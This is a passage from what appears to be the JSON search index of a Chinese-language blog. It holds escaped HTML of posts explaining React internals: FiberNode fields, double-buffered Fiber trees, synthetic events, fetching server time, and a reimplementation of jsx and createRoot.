class=\"line\">    <span class=\"comment\">// This won't trigger the performance cliff mentioned above,</span></span><br><span class=\"line\">    <span class=\"comment\">// and it simplifies other profiler code (including DevTools).</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"variable language_\">this</span>.<span class=\"property\">actualDuration</span> = <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"variable language_\">this</span>.<span class=\"property\">actualStartTime</span> = -<span class=\"number\">1</span>;</span><br><span class=\"line\">    <span class=\"variable language_\">this</span>.<span class=\"property\">selfBaseDuration</span> = <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"variable language_\">this</span>.<span class=\"property\">treeBaseDuration</span> = <span class=\"number\">0</span>;</span><br><span class=\"line\">  }</span><br><span class=\"line\"></span><br><span class=\"line\">  {</span><br><span class=\"line\">    <span class=\"comment\">// This isn't directly used but is handy for debugging internals:</span></span><br><span class=\"line\">    <span class=\"variable language_\">this</span>.<span class=\"property\">_debugSource</span> = <span class=\"literal\">null</span>;</span><br><span class=\"line\">    <span class=\"variable language_\">this</span>.<span class=\"property\">_debugOwner</span> = <span class=\"literal\">null</span>;</span><br><span class=\"line\">    <span class=\"variable language_\">this</span>.<span class=\"property\">_debugNeedsRemount</span> = <span class=\"literal\">false</span>;</span><br><span class=\"line\">    <span class=\"variable language_\">this</span>.<span class=\"property\">_debugHookTypes</span> = <span class=\"literal\">null</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!hasBadMapPolyfill &amp;&amp; <span class=\"keyword\">typeof</span> <span class=\"title class_\">Object</span>.<span class=\"property\">preventExtensions</span> === <span class=\"string\">'function'</span>) {</span><br><span class=\"line\">      <span class=\"title class_\">Object</span>.<span class=\"title function_\">preventExtensions</span>(<span class=\"variable language_\">this</span>);</span><br><span class=\"line\">    }</span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br></pre></td></tr></tbody></table></figure>\n\n<h4 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h4><h5 id=\"tag\"><a href=\"#tag\" class=\"headerlink\" title=\"tag\"></a>tag</h5><p>表示 FiberNode 的类型，可以是 HostComponent、ClassComponent、FunctionComponent 等。</p>\n<h5 id=\"key\"><a href=\"#key\" class=\"headerlink\" title=\"key\"></a>key</h5><p>表示组件的唯一标识符，用于在列表渲染中进行元素的重用。</p>\n<h5 id=\"elementType\"><a href=\"#elementType\" class=\"headerlink\" title=\"elementType\"></a>elementType</h5><p>表示组件元素的类型。大部分情况同 type，某些情况不同，比如 FunctionComponent 使用 React.memo 包裹。</p>\n<h5 id=\"type\"><a href=\"#type\" class=\"headerlink\" title=\"type\"></a>type</h5><p>type 属性表示 FiberNode 对应的组件类型，可以是字符串（原生组件）或函数 / 类（自定义组件）。对于 FunctionComponent，指函数本身，对于 ClassComponent，指 class，对于 HostComponent，指 DOM 节点 tagName。</p>\n<h5 id=\"stateNode\"><a href=\"#stateNode\" class=\"headerlink\" title=\"stateNode\"></a>stateNode</h5><p>每个 FiberNode 包含一个 stateNode 属性，它指向组件实例。stateNode 可以是一个 DOM 元素（对于原生组件），也可以是一个类实例（对于自定义组件）。</p>\n<blockquote>\n<p>​\tFiberNode 使用链表结构来表示组件的层级关系</p>\n</blockquote>\n<h5 id=\"return\"><a href=\"#return\" class=\"headerlink\" title=\"return\"></a>return</h5><p>return 指向父节点。</p>\n<h5 id=\"child\"><a href=\"#child\" class=\"headerlink\" title=\"child\"></a>child</h5><p>  child 属性指向第一个子节点。</p>\n<h5 id=\"sibling\"><a href=\"#sibling\" class=\"headerlink\" title=\"sibling\"></a>sibling</h5><p>  sibling 属性指向下一个兄弟节点。</p>\n<h6 id=\"例子：\"><a href=\"#例子：\" class=\"headerlink\" title=\"例子：\"></a>例子：</h6><figure class=\"highlight plaintext\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">function App() {</span><br><span class=\"line\">  return (</span><br><span class=\"line\">    &lt;div&gt;</span><br><span class=\"line\">      i am</span><br><span class=\"line\">      &lt;span&gt;SongShao&lt;/span&gt;</span><br><span class=\"line\">    &lt;/div&gt;</span><br><span class=\"line\">  )</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br></pre></td></tr></tbody></table></figure>\n\n<p>对应的 <code>Fiber树</code>结构</p>\n<figure class=\"highlight sh\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">   App</span><br><span class=\"line\">   ||</span><br><span class=\"line\">child || <span class=\"built_in\">return</span></span><br><span class=\"line\">||</span><br><span class=\"line\"> --------div ----------------</span><br><span class=\"line\">      ||  \t\t\t ||</span><br><span class=\"line\">child || <span class=\"built_in\">return</span>  child || <span class=\"built_in\">return</span> </span><br><span class=\"line\">         ||\t\t\t\t ||</span><br><span class=\"line\">        i am ----------- span</span><br><span class=\"line\">               sibling    ||</span><br><span class=\"line\">           \t\t   child || <span class=\"built_in\">return</span></span><br><span class=\"line\">           \t\t \t     ||</span><br><span class=\"line\">           \t\t      SongShao</span><br><span class=\"line\">    </span><br></pre></td></tr></tbody></table></figure>\n\n<blockquote>\n<p>这里需要提一下，为什么父级指针叫做 <code>return</code> 而不是 <code>parent</code> 或者 <code>father</code> 呢？因为作为一个工作单元，<code>return</code> 指节点执完 <code>completeWork</code>（本章后面会介绍）后会返回的下一个节点。子 <code>Fiber节点</code>及其兄弟节点完成工作后会返回其父级节点，所以用 <code>return</code> 指代父级节点。</p>\n</blockquote>\n<h5 id=\"index\"><a href=\"#index\" class=\"headerlink\" title=\"index\"></a>index</h5><p>在父节点中的索引位置。</p>\n<h5 id=\"ref\"><a href=\"#ref\" class=\"headerlink\" title=\"ref\"></a>ref</h5><p>用于引用组件。</p>\n<h5 id=\"pendingProps\"><a href=\"#pendingProps\" class=\"headerlink\" title=\"pendingProps\"></a>pendingProps</h5><p>组件的待处理属性。</p>\n<h5 id=\"memoizedProps-和-memoizedState\"><a href=\"#memoizedProps-和-memoizedState\" class=\"headerlink\" title=\"memoizedProps 和 memoizedState\"></a>memoizedProps 和 memoizedState</h5><p>这些属性保存了组件的当前状态（props 和 state）。在渲染过程中，React 使用 memoizedProps 和 memoizedState 保存组件的最新状态，并通过比较前后两次状态的差异，确定是否需要更新组件。</p>\n<h5 id=\"updateQueue\"><a href=\"#updateQueue\" class=\"headerlink\" title=\"updateQueue\"></a>updateQueue</h5><p>用于存储组件的更新队列。</p>\n<h5 id=\"dependencies\"><a href=\"#dependencies\" class=\"headerlink\" title=\"dependencies\"></a>dependencies</h5><p>表示组件的依赖项。</p>\n<h5 id=\"mode\"><a href=\"#mode\" class=\"headerlink\" title=\"mode\"></a>mode</h5><p>表示渲染模式。</p>\n<h5 id=\"flags-和-subtreeFlags\"><a href=\"#flags-和-subtreeFlags\" class=\"headerlink\" title=\"flags 和 subtreeFlags\"></a>flags 和 subtreeFlags</h5><p>表示 FiberNode 的状态标志。</p>\n<h5 id=\"deletions\"><a href=\"#deletions\" class=\"headerlink\" title=\"deletions\"></a>deletions</h5><p>表示待删除的节点。</p>\n<h5 id=\"lanes-和-childLanes\"><a href=\"#lanes-和-childLanes\" class=\"headerlink\" title=\"lanes 和 childLanes\"></a>lanes 和 childLanes</h5><p>表示调度的优先级。</p>\n<h5 id=\"alternate\"><a href=\"#alternate\" class=\"headerlink\" title=\"alternate\"></a>alternate</h5><p>alternate 属性指向 FiberNode 的替代节点。在渲染过程中，React 会创建两个 FiberNode，一个表示当前渲染状态，另一个表示下一次渲染状态。通过 alternate 属性，React 在两个状态之间进行比较，找出需要更新的节点。</p>\n<h5 id=\"actualDuration、actualStartTime、selfBaseDuration、treeBaseDuration\"><a href=\"#actualDuration、actualStartTime、selfBaseDuration、treeBaseDuration\" class=\"headerlink\" title=\"actualDuration、actualStartTime、selfBaseDuration、treeBaseDuration\"></a>actualDuration、actualStartTime、selfBaseDuration、treeBaseDuration</h5><p>用于记录组件的实际渲染时间和基准时间。</p>\n<h5 id=\"debugSource、-debugOwner、-debugNeedsRemount、-debugHookTypes\"><a href=\"#debugSource、-debugOwner、-debugNeedsRemount、-debugHookTypes\" class=\"headerlink\" title=\"__debugSource、__debugOwner、__debugNeedsRemount、__debugHookTypes\"></a>__debugSource、__debugOwner、__debugNeedsRemount、__debugHookTypes</h5><p>用于调试和内部记录。</p>\n","categories":["React","Fiber"],"tags":["前端","JavaScript","react","Fiber"]},{"title":"Fiber 架构工作原理","url":"//react/fiber/works.html","content":"<h2 id=\"什么是“双缓存”？\"><a href=\"#什么是“双缓存”？\" class=\"headerlink\" title=\"什么是“双缓存”？\"></a>什么是 “双缓存”？</h2><p>“双缓存” 是一种常见的图形处理技术，用于在图像渲染中实现平滑的、无闪烁的更新效果。它通过使用两个缓冲区（即两块内存区域）来完成。其中一个缓冲区用于显示图像，而另一个缓冲区则用于在后台进行图像的更新和绘制。当更新完成后，通过交换两个缓冲区的引用，以实现无缝的切换和更新。</p>\n<p>在图形处理中使用双缓存的好处包括：</p>\n<ol>\n<li>无闪烁：通过在后台缓冲区进行绘制，然后将绘制结果一次性地切换到显示缓冲区，可以避免在图像更新过程中的闪烁问题。这对于实时图形、动画和视频等应用非常重要。</li>\n<li>平滑更新：使用双缓冲可以实现平滑的更新效果。在后台缓冲区进行绘制和更新，然后在更新完成后将其切换到显示缓冲区，可以避免直接在显示缓冲区上进行绘制和修改，从而减少了可能出现的可见的渲染中间状态。</li>\n<li>减少渲染延迟：使用双缓冲可以减少渲染延迟。由于绘制和更新发生在后台缓冲区，因此可以在绘制完成后立即切换到显示缓冲区，从而减少了等待绘制完成的时间，提高了渲染效率和响应时间。</li>\n</ol>\n<p>双缓存技术在图形处理、动画、视频播放和游戏开发等领域得到广泛应用。在图形库、操作系统和桌面应用程序中，双缓存被用于实现平滑的图像渲染和交互效果。在前端开发中，双缓存也被广泛应用于图形绘制和动画效果的实现，以提供更好的用户体验。</p>\n<p><code>React</code> 使用 “双缓存” 来完成 <code>Fiber树</code>的构建与替换 —— 对应着 <code>DOM树</code>的创建与更新。</p>\n<h2 id=\"双缓存Fiber树\"><a href=\"#双缓存Fiber树\" class=\"headerlink\" title=\"双缓存Fiber树\"></a>双缓存 Fiber 树</h2><p>在 <code>React</code> 中最多会同时存在两棵 <code>Fiber树</code>。当前屏幕上显示内容对应的 <code>Fiber树</code>称为 <code>current Fiber树</code>，正在内存中构建的 <code>Fiber树</code>称为 <code>workInProgress Fiber树</code>。</p>\n<p><code>current Fiber树</code>中的 <code>Fiber节点</code>被称为 <code>current fiber</code>，<code>workInProgress Fiber树</code>中的 <code>Fiber节点</code>被称为 <code>workInProgress fiber</code>，他们通过 <code>alternate</code> 属性连接。</p>\n<figure class=\"highlight js\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">currentFiber.<span class=\"property\">alternate</span> === workInProgressFiber;</span><br><span class=\"line\">workInProgressFiber.<span class=\"property\">alternate</span> === currentFiber;</span><br></pre></td></tr></tbody></table></figure>\n\n<p><code>React </code>应用的根节点通过使 <code>current </code> 指针在不同 <code>Fiber树</code> 的 <code>rootFiber</code> 间切换来完成 <code>current Fiber</code> 树指向的切换。</p>\n<p>即当 <code>workInProgress Fiber树</code> 构建完成交给 <code>Renderer</code> 渲染在页面上后，应用根节点的 <code>current</code> 指针指向 <code>workInProgress Fiber树</code> ，此时 <code>workInProgress Fiber树</code>就变为 <code>current Fiber树</code>。</p>\n<p>每次状态更新都会产生新的 <code>workInProgress Fiber树</code>，通过 <code>current</code> 与 <code>workInProgress</code> 的替换，完成 <code>DOM</code> 更新。</p>\n<p>接下来我们以具体例子讲解 <code>mount时</code>、<code>update时</code>的构建 / 替换流程。</p>\n<h2 id=\"mount时\"><a href=\"#mount时\" class=\"headerlink\" title=\"mount时\"></a>mount 时</h2><p>考虑如下例子：</p>\n<figure class=\"highlight js\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">App</span>(<span class=\"params\"></span>) {</span><br><span class=\"line\">  <span class=\"keyword\">return</span> (</span><br><span class=\"line\">    <span class=\"language-xml\"><span class=\"tag\">&lt;<span class=\"name\">h1</span>&gt;</span>hello<span class=\"tag\">&lt;<span class=\"name\">span</span> <span class=\"attr\">style</span>=<span class=\"string\">{{</span> <span class=\"attr\">color:</span> '<span class=\"attr\">red</span>' }}&gt;</span>world<span class=\"tag\">&lt;/<span class=\"name\">span</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">h1</span>&gt;</span></span></span><br><span class=\"line\">  )</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"title class_\">ReactDOM</span>.<span class=\"title function_\">render</span>(<span class=\"language-xml\"><span class=\"tag\">&lt;<span class=\"name\">App</span>/&gt;</span></span>, <span class=\"variable language_\">document</span>.<span class=\"title function_\">getElementById</span>(<span class=\"string\">'root'</span>));</span><br></pre></td></tr></tbody></table></figure>\n\n<ol>\n<li>首次执行 <code>ReactDOM.render</code> 会创建 <code>fiberRootNode</code>（源码中叫 <code>fiberRoot</code>）和 <code>rootFiber</code>。其中 <code>fiberRootNode</code> 是整个应用的根节点，<code>rootFiber</code> 是 <code>&lt;App/&gt;</code> 所在组件树的根节点。</li>\n</ol>\n<p>之所以要区分 <code>fiberRootNode</code> 与 <code>rootFiber</code>，是因为在应用中我们可以多次调用 <code>ReactDOM.render</code> 渲染不同的组件树，他们会拥有不同的 <code>rootFiber</code>。但是整个应用的根节点只有一个，那就是 <code>fiberRootNode</code>。</p>\n<p><code>fiberRootNode</code> 的 <code>current</code> 会指向当前页面上已渲染内容对应 <code>Fiber树</code>，即 <code>current Fiber树</code>。</p>\n<p><img data-src=\"https://pic.imgdb.cn/item/653b2a66c458853aef7f6122.jpg\" alt=\"fiberRootNode\"></p>\n<p><code>fiberRootNode.current = rootFiber;</code></p>\n<p>由于是首屏渲染，页面中还没有挂载任何 <code>DOM</code>，所以 <code>fiberRootNode.current</code> 指向的 <code>rootFiber</code> 没有任何<code>子Fiber节点</code>（即 <code>current Fiber树</code>为空）。</p>\n<ol start=\"2\">\n<li>接下来进入 <code>render阶段</code>，根据组件返回的 <code>JSX</code> 在内存中依次创建 <code>Fiber节点</code>并连接在一起构建 <code>Fiber树</code>，被称为 <code>workInProgress Fiber树</code>。（下图中右侧为内存中构建的树，左侧为页面显示的树）</li>\n</ol>\n<p>在构建 <code>workInProgress Fiber树</code>时会尝试复用 <code>current Fiber树</code>中已有的 <code>Fiber节点</code>内的属性，在<code>首屏渲染</code>时只有 <code>rootFiber</code> 存在对应的 <code>current fiber</code>（即 <code>rootFiber.alternate</code>）。</p>\n<p><img data-src=\"https://pic.imgdb.cn/item/653b55d2c458853aef05059f.jpg\"></p>\n<ol start=\"3\">\n<li>图中右侧已构建完的 <code>workInProgress Fiber树</code>在 <code>commit阶段</code>渲染到页面。</li>\n</ol>\n<p>此时 <code>DOM</code> 更新为右侧树对应的样子。<code>fiberRootNode</code> 的 <code>current</code> 指针指向 <code>workInProgress Fiber树</code>使其变为 <code>current Fiber 树</code>。</p>\n<p><img data-src=\"https://react.iamkasong.com/img/wipTreeFinish.png\"></p>\n<h2 id=\"update时\"><a href=\"#update时\" class=\"headerlink\" title=\"update时\"></a>update 时</h2><ol>\n<li><p>接下来我们点击 <code>p节点</code>触发状态改变，这会开启一次新的 <code>render阶段</code>并构建一棵新的 <code>workInProgress Fiber 树</code>。</p>\n<p><img data-src=\"https://react.iamkasong.com/img/wipTreeUpdate.png\"></p>\n</li>\n</ol>\n<p>和 <code>mount</code> 时一样，<code>workInProgress fiber</code> 的创建可以复用 <code>current Fiber树</code>对应的节点数据。</p>\n<ol start=\"2\">\n<li><code>workInProgress Fiber 树</code>在 <code>render阶段</code>完成构建后进入 <code>commit阶段</code>渲染到页面上。渲染完毕后，<code>workInProgress Fiber 树</code>变为 <code>current Fiber 树</code>。</li>\n</ol>\n<p><img data-src=\"https://pic.imgdb.cn/item/653b55f9c458853aef0589a3.jpg\" alt=\"渲染过程\"></p>\n","categories":["React","Fiber"],"tags":["前端","JavaScript","react","Fiber"]},{"title":"React 获取服务器端时间","url":"//react/service/time.html","content":"<h2 id=\"React-获取服务器端时间\"><a href=\"#React-获取服务器端时间\" class=\"headerlink\" title=\"React 获取服务器端时间\"></a>React 获取服务器端时间</h2><p><strong>思路</strong>：React 获取服务器端时间，本质上就是给服务器端发送一个请求，然后从返回数据里面的 headers 里面获取到服务器 date，然后更新服务器时间去格式化，获取服务器时间结束。按秒进行数据刷新，其实也很简单，就是使用定时器，进行动态递增即可，直接上代码。</p>\n<span id=\"more\"></span>\n<p>获取服务器时间的方法：</p>\n<figure class=\"highlight plaintext\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">changeTime = async () =&gt; {</span><br><span class=\"line\">    let leftTime = await axios.get('/').then(response =&gt; {</span><br><span class=\"line\">        console.log(response.headers)</span><br><span class=\"line\">        return new Date(response.headers.date).getTime()</span><br><span class=\"line\">     }).catch(error =&gt; {</span><br><span class=\"line\">        console.log(error)</span><br><span class=\"line\">        return 0</span><br><span class=\"line\">     })</span><br><span class=\"line\">        this.setState({</span><br><span class=\"line\">        time: moment(leftTime).format('YYYY-MM-DD HH:mm:ss')</span><br><span class=\"line\">    })</span><br><span class=\"line\">}</span><br></pre></td></tr></tbody></table></figure>\n\n<p>自动增加的方法（以秒为单位）:</p>\n<figure class=\"highlight plaintext\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">addTime = date =&gt; {</span><br><span class=\"line\">      let newDate = new Date(date)</span><br><span class=\"line\">      newDate.setSeconds(newDate.getSeconds() + 1)</span><br><span class=\"line\">      this.setState({</span><br><span class=\"line\">        time: moment(newDate).format('YYYY-MM-DD HH:mm:ss')</span><br><span class=\"line\">      })</span><br><span class=\"line\">      window.time = {</span><br><span class=\"line\">        date: this.state.time,</span><br><span class=\"line\">        timestamp: Date.parse(new Date(this.state.time))</span><br><span class=\"line\">      }</span><br><span class=\"line\">    }</span><br></pre></td></tr></tbody></table></figure>\n\n<p>最后根据 react  state 状态进行页面渲染。</p>\n","categories":["React"],"tags":["前端","JavaScript","react"]},{"title":"React 使用合成事件（SyntheticEvent）","url":"//react/synthetic/event.html","content":"<h1 id=\"React-使用合成事件\"><a href=\"#React-使用合成事件\" class=\"headerlink\" title=\"React 使用合成事件\"></a>React 使用合成事件</h1><p>React 使用合成事件（SyntheticEvent）来处理浏览器原生事件的跨浏览器兼容性问题。合成事件是一个封装了原生事件的对象，提供了一致的跨浏览器接口，使您能够在不同浏览器中以一致的方式处理事件。</p>\n<span id=\"more\"></span>\n<p>在 React 中，您可以通过在组件中定义事件处理函数并将其传递给相应的元素来处理合成事件。例如，您可以在一个按钮上定义一个点击事件处理函数：</p>\n<figure class=\"highlight js\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">MyComponent</span> <span class=\"keyword\">extends</span> <span class=\"title class_ inherited__\">React.Component</span> {</span><br><span class=\"line\">  handleClick = <span class=\"function\">(<span class=\"params\">event</span>) =&gt;</span> {</span><br><span class=\"line\">    <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"string\">'Button clicked!'</span>);</span><br><span class=\"line\">  }</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"title function_\">render</span>(<span class=\"params\"></span>) {</span><br><span class=\"line\">    <span class=\"keyword\">return</span> (</span><br><span class=\"line\">      <span class=\"language-xml\"><span class=\"tag\">&lt;<span class=\"name\">button</span> <span class=\"attr\">onClick</span>=<span class=\"string\">{this.handleClick}</span>&gt;</span>Click me!<span class=\"tag\">&lt;/<span class=\"name\">button</span>&gt;</span></span></span><br><span class=\"line\">    );</span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br></pre></td></tr></tbody></table></figure>\n<p>在上面的示例中，我们定义了一个名为 handleClick 的点击事件处理函数，并将其传递给按钮的 onClick 属性。当按钮被点击时，React 将自动创建一个合成事件对象，并将其作为参数传递给 handleClick 函数。您可以在事件处理函数中访问合成事件对象，并使用其属性和方法进行操作。</p>\n<p>合成事件对象具有与原生事件对象相似的属性和方法，但也有一些额外的属性和方法，用于处理 React 特定的功能。例如，您可以使用 event.target 来访问触发事件的元素，event.preventDefault () 来阻止默认行为，以及 event.stopPropagation () 来阻止事件冒泡。</p>\n<p>请注意，由于合成事件是 React 提供的跨浏览器抽象，它并不是浏览器原生事件对象。因此，某些浏览器特定的功能可能不可用或表现不一致。如果需要访问原生事件对象，您可以使用合成事件对象的 nativeEvent 属性。</p>\n<h1 id=\"React合成事件如何阻止事件传播\"><a href=\"#React合成事件如何阻止事件传播\" class=\"headerlink\" title=\"React合成事件如何阻止事件传播\"></a>React 合成事件如何阻止事件传播</h1><p>React 合成事件可以通过调用 <code>e.stopPropagation()</code> 来阻止事件传播。<br>当根容器接收到捕获事件时，先触发一次 React 事件的捕获阶段，然后再执行原生事件的捕获传播。所以，调用 <code>e.stopPropagation()</code> 可以阻止原生事件的传播。<br>合成事件是根据事件类型对原生事件的属性进行处理，并包装了关键方法，从而实现了事件的触发和处理。</p>\n","categories":["React"],"tags":["前端","JavaScript","react"]},{"title":"React 实现原理","url":"//react/implement.html","content":"<h3 id=\"实现jsx\"><a href=\"#实现jsx\" class=\"headerlink\" title=\"实现jsx\"></a>实现 jsx</h3><figure class=\"highlight jsx\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">let</span> element = (</span><br><span class=\"line\"><span class=\"language-xml\"><span class=\"tag\">&lt;<span class=\"name\">h1</span>&gt;</span></span></span><br><span class=\"line\"><span class=\"language-xml\">    hello<span class=\"tag\">&lt;<span class=\"name\">span</span> <span class=\"attr\">style</span>=<span class=\"string\">{{</span> <span class=\"attr\">color:</span> \"<span class=\"attr\">red</span>\" }}&gt;</span>world<span class=\"tag\">&lt;/<span class=\"name\">span</span>&gt;</span></span></span><br><span class=\"line\"><span class=\"language-xml\"><span class=\"tag\">&lt;/<span class=\"name\">h1</span>&gt;</span></span></span><br><span class=\"line\">);</span><br><span class=\"line\"><span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(element);</span><br><span class=\"line\"></span><br></pre></td></tr></tbody></table></figure>\n\n<h3 id=\"编译后\"><a href=\"#编译后\" class=\"headerlink\" title=\"编译后\"></a>编译后</h3><p><img data-src=\"https://pic.imgdb.cn/item/653b2718c458853aef75775a.jpg\" alt=\"jsx 编译之后\"></p>\n<h3 id=\"如何实现\"><a href=\"#如何实现\" class=\"headerlink\" title=\"如何实现\"></a>如何实现</h3><ol>\n<li><p>jsx-dev-runtime.js</p>\n<figure class=\"highlight jsx\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">export</span> { jsxDEV } <span class=\"keyword\">from</span> <span class=\"string\">\"./jsx/ReactJSXElement\"</span>;</span><br><span class=\"line\"></span><br></pre></td></tr></tbody></table></figure>\n</li>\n<li><p>ReactJSXElement.js</p>\n<figure class=\"highlight jsx\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> hasOwnProperty <span class=\"keyword\">from</span> <span class=\"string\">'../../shared/hasOwnProperty'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// dom 类型</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> { <span class=\"variable constant_\">REACT_ELEMENT_TYPE</span>  } <span class=\"keyword\">from</span> <span class=\"string\">'../../shared/ReactSymbols'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> <span class=\"variable constant_\">RESERVED_PROPS</span> = {</span><br><span class=\"line\">    <span class=\"attr\">key</span>: <span class=\"literal\">true</span>,</span><br><span class=\"line\">    <span class=\"attr\">ref</span>: <span class=\"literal\">true</span>,</span><br><span class=\"line\">    <span class=\"attr\">__self</span>: <span class=\"literal\">true</span>,</span><br><span class=\"line\">    <span class=\"attr\">__source</span>: <span class=\"literal\">true</span></span><br><span class=\"line\">};</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">hasValidKey</span>(<span class=\"params\">config</span>) {</span><br><span class=\"line\">    <span class=\"keyword\">return</span> config.<span class=\"property\">key</span> !== <span class=\"literal\">undefined</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">hasValidRef</span>(<span class=\"params\">config</span>) {</span><br><span class=\"line\">    <span class=\"keyword\">return</span> config.<span class=\"property\">ref</span> !== <span class=\"literal\">undefined</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// ReactElement 创建</span></span><br><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">ReactElement</span>(<span class=\"params\">type, key, ref, props, owner</span>) {</span><br><span class=\"line\">    <span class=\"keyword\">return</span> {</span><br><span class=\"line\">        <span class=\"comment\">// 这个标签允许我们唯一地将其标识为React元素</span></span><br><span class=\"line\">        <span class=\"attr\">$$typeof</span>: <span class=\"variable constant_\">REACT_ELEMENT_TYPE</span>,</span><br><span class=\"line\">        type,</span><br><span class=\"line\">        key,</span><br><span class=\"line\">        ref,</span><br><span class=\"line\">        props,</span><br><span class=\"line\">        </span><br><span class=\"line\">    }</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">function</span> <span class=\"title function_\">jsxDEV</span>(<span class=\"params\">type, config</span>) {</span><br><span class=\"line\">    <span class=\"comment\">// 提取保留名称</span></span><br><span class=\"line\">    <span class=\"keyword\">const</span> props = {};</span><br><span class=\"line\">    <span class=\"keyword\">let</span> key = <span class=\"literal\">null</span>;</span><br><span class=\"line\">    <span class=\"keyword\">let</span> ref = <span class=\"literal\">null</span>;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(<span class=\"title function_\">hasValidKey</span>(config)) {</span><br><span class=\"line\">        key = config.<span class=\"property\">key</span>;</span><br><span class=\"line\">    }</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span>(<span class=\"title function_\">hasValidRef</span>(config)) {</span><br><span class=\"line\">        ref = config.<span class=\"property\">ref</span>;</span><br><span class=\"line\">    }</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span>(<span class=\"keyword\">const</span> propName <span class=\"keyword\">in</span> config) {</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(hasOwnProperty.<span class=\"title function_\">call</span>(config, propName) &amp;&amp;</span><br><span class=\"line\">        !<span class=\"variable constant_\">RESERVED_PROPS</span>.<span class=\"title function_\">hasOwnProperty</span>(propName)</span><br><span class=\"line\">        ) {</span><br><span class=\"line\">            props[propName] = config[propName];</span><br><span class=\"line\">        }</span><br><span class=\"line\">    }</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"title class_\">ReactElement</span>(type, key, ref, props)</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br></pre></td></tr></tbody></table></figure>\n</li>\n<li><p>hasOwnProperty.js</p>\n<figure class=\"highlight jsx\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> { hasOwnProperty } = <span class=\"title class_\">Object</span>.<span class=\"property\"><span class=\"keyword\">prototype</span></span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">default</span> hasOwnProperty;</span><br></pre></td></tr></tbody></table></figure>\n</li>\n<li><p>ReactSymbols.js</p>\n<figure class=\"highlight jsx\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 用于标记类似 ReactElement 类型的符号。</span></span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">const</span> <span class=\"variable constant_\">REACT_ELEMENT_TYPE</span> = <span class=\"title class_\">Symbol</span>.<span class=\"title function_\">for</span>(<span class=\"string\">'react.element'</span>);</span><br></pre></td></tr></tbody></table></figure></li>\n</ol>\n<h3 id=\"根节点和根fiber\"><a href=\"#根节点和根fiber\" class=\"headerlink\" title=\"根节点和根fiber\"></a>根节点和根 fiber</h3><ul>\n<li>需要给 react 提供一个根节点，之后每个节点都是渲染在根节点内部的。</li>\n</ul>\n<figure class=\"highlight js\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> root = <span class=\"title function_\">createRoot</span>(<span class=\"variable language_\">document</span>.<span class=\"title function_\">getElementById</span>(<span class=\"string\">'root'</span>))</span><br></pre></td></tr></tbody></table></figure>\n\n<ul>\n<li>根 fiber 可以通俗理解为一个装着所有虚拟 dom 的容器，每个虚拟 dom 又单独对应一个 fiber，</li>\n<li>渲染可以以单个 fiber 为单位暂停 / 恢复。</li>\n<li>需要创建两个根 <code>fiber</code> 去相互替换展示。</li>\n</ul>\n<h4 id=\"创建根节点\"><a href=\"#创建根节点\" class=\"headerlink\" title=\"创建根节点\"></a>创建根节点</h4><p>更改 main.jsx</p>\n<figure class=\"highlight jsx\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> { createRoot } <span class=\"keyword\">from</span> <span class=\"string\">\"react-dom/client\"</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">let</span> element = (</span><br><span class=\"line\"><span class=\"language-xml\"><span class=\"tag\">&lt;<span class=\"name\">h1</span>&gt;</span>hello<span class=\"tag\">&lt;<span class=\"name\">span</span> <span class=\"attr\">style</span>=<span class=\"string\">{{</span> <span class=\"attr\">color:</span> '<span class=\"attr\">red</span>' }}&gt;</span>world<span class=\"tag\">&lt;/<span 